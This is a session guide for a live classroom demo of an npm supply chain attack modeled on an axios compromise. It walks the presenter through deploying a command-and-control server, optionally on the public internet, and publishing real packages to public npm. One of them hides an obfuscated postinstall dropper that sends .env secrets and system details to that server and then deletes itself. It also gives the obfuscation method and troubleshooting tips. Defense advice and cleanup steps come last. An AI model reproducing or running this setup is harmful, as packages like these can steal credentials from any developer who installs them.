# Realistic npm Supply Chain Attack — Live Session Guide (Axios-Style)

## Overview

This demo replicates the **March 31, 2026 axios supply chain attack** on the real npm registry. Two packages are published under your npm scope:

| Package | Role | Mirrors |
|---------|------|---------|
| `@yourname/csec-form-helpers` | Legitimate-looking form validation library | `axios` (the trusted package) |
| `@yourname/csec-crypto-utils` | Hidden dependency with obfuscated postinstall dropper | `plain-crypto-js` (the malicious dependency) |

The victim runs `npm install @yourname/csec-form-helpers` — npm resolves the hidden dependency, the obfuscated `postinstall` hook runs silently, exfiltrates `.env` secrets to your C2 server, then **erases itself** leaving no forensic trace.

---

## Prerequisites

- **npm account** with publishing access (`npm login`)
- **Node.js** on both attacker and victim machines
- The C2 server from `demos/token-stealer/c2-server/`

---

## Before the Session (Setup)

You have two options for the C2 server: deploy to **Render** (recommended — works from anywhere) or run **locally**.

---

### Option A: Deploy C2 to Render (Recommended)

This makes the C2 dashboard publicly accessible. The victim can be anywhere — no "same network" requirement.

**Step 1: Deploy the C2 server to Render**

The C2 service is already configured in `render.yaml`. Deploy it:

```bash
# Option 1: Push to GitHub and use Render Dashboard
# Go to https://dashboard.render.com → New → Blueprint → select your repo
# Render will auto-detect render.yaml and deploy csec-c2-server

# Option 2: Deploy manually via Render CLI
# render blueprint apply
```

After deploy, Render gives you a URL like `https://csec-c2-server.onrender.com`.

**Step 2: Login to npm**

```bash
npm login
```

**Step 3: Publish with your Render URL**

```bash
cd demos/token-stealer/npm-publish
./publish.sh https://csec-c2-server.onrender.com
```

**Step 4: Open the C2 dashboard**

Visit `https://csec-c2-server.onrender.com` in your browser — the live dashboard is waiting for victims.

**Step 5: Verify on npmjs.com**

Open `https://www.npmjs.com/package/@yourname/csec-form-helpers` — looks like a normal form validation package.

---

### Option B: Run C2 Locally (Same Network Required)

Both machines must be on the same network (WiFi, LAN, VPN).

**Step 1: Login to npm**

```bash
npm login
```

**Step 2: Publish both packages**

```bash
cd demos/token-stealer/npm-publish
./publish.sh
```

The script auto-detects your local IP. To specify manually:

```bash
./publish.sh 192.168.1.50 4444
```

**Step 3: Start the C2 server**

```bash
cd demos/token-stealer/c2-server
node server.js
# Dashboard at http://localhost:4444
```

**Step 4: Verify on npmjs.com**

Open `https://www.npmjs.com/package/@yourname/csec-form-helpers` in a browser. It looks like a completely normal form validation package. The dependency on `@yourname/csec-crypto-utils` is listed but looks harmless.

---

## During the Session

### Act 1: The "Innocent" Install

**On the victim machine (or have a participant do this):**

> "I'm a developer starting a new project. I need form validation."

```bash
mkdir my-project && cd my-project
npm init -y
```

> "My project has secrets in a .env file — API keys, database credentials."

```bash
cat > .env << 'EOF'
GITHUB_TOKEN=ghp_R3aLt0k3nF0rD3m0Purp0s3s1234567890
NPM_TOKEN=npm_aB9xKzLmN8pQrStUvWx7654321fedcba
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
DATABASE_URL=postgres://admin:s3cret@prod-db.internal:5432/myapp
STRIPE_SECRET_KEY=sk_live_51N3xAmPl3K3y0000000000
EOF
```

> "I found a form validation library on npm. Looks good — let me install it."

```bash
npm install @yourname/csec-form-helpers
```

**Point out:** The npm output looks completely normal. No warnings. No errors.

> "Let's use it — works great!"

```bash
node -e "
const { validateEmail, validatePassword } = require('@yourname/csec-form-helpers');
console.log('Email valid:', validateEmail('user@corp.com'));
console.log('Password:', validatePassword('Test@1234'));
"
```

### Act 2: The Reveal

**Switch to the attacker machine's C2 dashboard** (`http://localhost:4444`)

All the victim's secrets are displayed:
- Every key-value pair from `.env`
- Hostname, username, OS, IP, MAC address
- Paths to sensitive files found (~/.ssh/id_rsa, ~/.npmrc, etc.)

> "The postinstall hook ran silently during npm install. Your secrets were gone before you typed your first line of code."

### Act 3: The Forensic Investigation

> "Let's investigate. Where did the attack come from?"

**On the victim machine:**

```bash
# Check node_modules — the package works fine
ls node_modules/@yourname/csec-form-helpers/
# index.js, package.json — nothing suspicious

# Check the hidden dependency
ls node_modules/@yourname/csec-crypto-utils/
# index.js, package.json — also looks clean!
# No setup.js. No postinstall hook in package.json.
# The dropper ERASED ITSELF after running.

# But the lockfile tells the truth
cat package-lock.json | grep -A 5 "csec-crypto-utils"
# Shows the dependency exists — it was pulled in automatically
```

> "The attacker's code deleted itself after execution. If you inspect `node_modules` after the fact, you see nothing suspicious. This is exactly what the real axios attack did."

### Act 4: Reverse Engineering the Attack

> "Let's go back to the source and reverse-engineer the obfuscation."

**On the attacker machine:**

```bash
cd demos/token-stealer/npm-publish

# Look at the raw setup.js — it's a wall of obfuscated text
cat csec-crypto-utils/setup.js

# Now deobfuscate it layer by layer
node deobfuscate.js
```

Walk through each step the deobfuscate script shows:
1. **Examine**: A huge encoded string, a key, a constant, a decoder function
2. **Reverse the string**: First layer undone
3. **Restore Base64 padding**: `!` back to `=`
4. **Base64 decode**: Binary data revealed
5. **XOR decrypt**: With key `OrDeR_7077` and constant `333`
6. **The plaintext payload**: Full .env scanner, system recon, C2 exfiltration, self-deletion

> "This is the exact same double-obfuscation technique the real axios attacker used. Reversed Base64 with padding substitution, XOR cipher. Two layers that defeat most static analysis tools."

### Act 5: Defense Discussion

> "How could this have been prevented?"

1. **`npm install --ignore-scripts`** — blocks postinstall hooks entirely
2. **Lockfiles + `npm ci`** — committed lockfile prevents pulling unexpected versions
3. **Socket.dev / Snyk** — flags suspicious postinstall behavior (Socket detected the real attack in 6 minutes)
4. **Audit before installing** — `npm info @yourname/csec-form-helpers` shows the dependency
5. **Never store raw secrets in `.env`** — use vaults (AWS Secrets Manager, HashiCorp Vault)
6. **MFA on npm accounts** — the real attack started with a hijacked maintainer account
7. **Short-lived tokens / OIDC publishing** — no long-lived npm access tokens

---

## After the Session (Cleanup)

Remove both packages from npm immediately:

```bash
cd demos/token-stealer/npm-publish
./unpublish.sh
```

This removes both `@yourname/csec-form-helpers` and `@yourname/csec-crypto-utils` from the public registry.

---

## File Map

| File | Role |
|------|------|
| `csec-form-helpers/index.js` | Clean form validation code (the cover) |
| `csec-form-helpers/package.json` | Depends on `@yourname/csec-crypto-utils` (the hidden chain) |
| `csec-crypto-utils/index.js` | Benign crypto helpers (another cover) |
| `csec-crypto-utils/package.json` | Has `postinstall: node setup.js` (the trigger) |
| `csec-crypto-utils/setup.js` | **THE OBFUSCATED DROPPER** (generated by build script) |
| `csec-crypto-utils/package.md` | Clean package.json copy (used in self-deletion swap) |
| `payload.js` | Plaintext payload source (not published) |
| `build-obfuscated.js` | Encodes payload with reversed Base64 + XOR |
| `deobfuscate.js` | Reverse engineering exercise — decodes setup.js layer by layer |
| `publish.sh` | One-command publish to real npm |
| `unpublish.sh` | One-command cleanup after session |

---

## How This Maps to the Real Axios Attack

| Axios Attack (March 31, 2026) | This Demo |
|-------------------------------|-----------|
| `axios@1.14.1` (trusted, 100M downloads) | `@yourname/csec-form-helpers` |
| `plain-crypto-js@4.2.1` (hidden dependency) | `@yourname/csec-crypto-utils` |
| `setup.js` postinstall dropper | `setup.js` postinstall dropper |
| Reversed Base64 + XOR (key: `OrDeR_7077`, const: `333`) | Same obfuscation, same key, same constant |
| Self-deletion + package.json swap | Self-deletion + package.md swap |
| Cross-platform RAT (macOS/Win/Linux) | Recon + .env exfiltration (safe, no RAT) |
| C2 at `sfrclak[.]com:8000` | C2 at your IP:4444 |
| Attributed to Sapphire Sleet (DPRK) | Educational demo |

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| `npm ERR! 402` on publish | Scoped packages need `--access public` (already in publish.sh) |
| `npm ERR! 403` on publish | Package name may be taken. Change the name in package.json files |
| Victim can't reach C2 (local) | Check firewall: `sudo ufw allow 4444`. Both must be on same network |
| Victim can't reach C2 (Render) | Ensure the Render service is running (not spun down). Free tier spins down after inactivity — visit the dashboard URL to wake it |
| Render service won't start | Check Render logs. The C2 server uses `PORT` env var which Render sets automatically |
| Self-deletion didn't work | The `setup.js` `__dirname` may differ in some npm versions. Check `node_modules/@yourname/csec-crypto-utils/` |
| Unpublish fails | npm has a 72-hour unpublish window for packages with no dependents. After that, contact npm support |
| HTTPS errors in payload | Make sure you passed the full URL with `https://` to publish.sh. The payload auto-selects http vs https |
